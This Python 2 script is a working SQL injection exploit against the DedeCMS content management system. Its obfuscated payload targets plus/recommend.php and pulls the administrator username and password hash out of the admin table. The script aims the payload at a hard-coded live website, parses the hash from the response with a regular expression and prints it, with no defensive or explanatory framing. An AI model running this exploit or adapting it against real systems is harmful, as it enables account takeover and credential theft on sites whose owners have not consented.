#coding=utf-8

import urllib2
import re

"""
reference : http://www.cnseay.com/3714/
"""

class dedeCmsExploit :
	def __init__(self,host):
		self.host = host
		self.exploits = ['''plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294''']
	def getVersion(self):
		tag = ""
	def gethash(self):
		realurl = self.host + self.exploits[0]
		data = None
		try:
			data = urllib2.urlopen(realurl).read()
		except:
			pass
		if data != None:
			result = re.search("\|\w+\|[a-zA-Z0-9]+",data)
			userpass = result.group()
			temp = userpass.split('|')
			username = temp[1]
			passw = temp[2][2:-1]
			print username , passw		


host = "http://www.erzhuhui.org/"
temp = dedeCmsExploit(host)
temp.gethash()